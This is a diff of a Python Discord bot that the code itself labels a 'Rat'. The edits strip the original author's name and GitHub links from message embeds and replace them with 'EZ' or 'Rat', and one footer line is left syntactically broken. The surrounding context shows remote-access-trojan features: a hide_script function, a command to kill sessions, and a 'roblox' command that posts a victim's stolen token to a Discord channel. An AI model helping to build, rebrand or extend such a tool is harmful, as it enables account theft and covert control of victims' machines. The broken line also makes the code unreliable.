@@ -58,10 +58,10 @@ intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 def navi_embed(text, color=0x00aaff, thumbnail=True):
-    embed = discord.Embed(title="NAVI • TERMINAL", description=text, color=color)
+    embed = discord.Embed(title="TERMINAL", description=text, color=color)
     if thumbnail:
-        embed.set_thumbnail(url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
-    embed.set_footer(text="Navi Multitool • https://github.com/glockinhand/navi-multitool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
+        embed.set_thumbnail(url="EZ")
+    embed.set_footer(text=" EZ"EZ")
     return embed
 
 def hide_script():
@@ -792,7 +792,7 @@ def get_embed(page: str):
             "`!kill <session/all>`"
         )
 
-    e.set_footer(text="Navi Rat • github.com/glockinhand/navi-multitool")
+    e.set_footer(text="Rat")
     return e
 
 class HelpSelect(discord.ui.Select):
@@ -983,7 +983,7 @@ async def roblox(ctx):
     else:
         embed.add_field(name="Token", value=f"```\n{token}\n```", inline=False)
 
-    embed.set_footer(text=f"Navi Multitool | https://github.com/glockinhand")
+    embed.set_footer(text=f"EZ")
 
     await ctx.send(embed=embed)
 
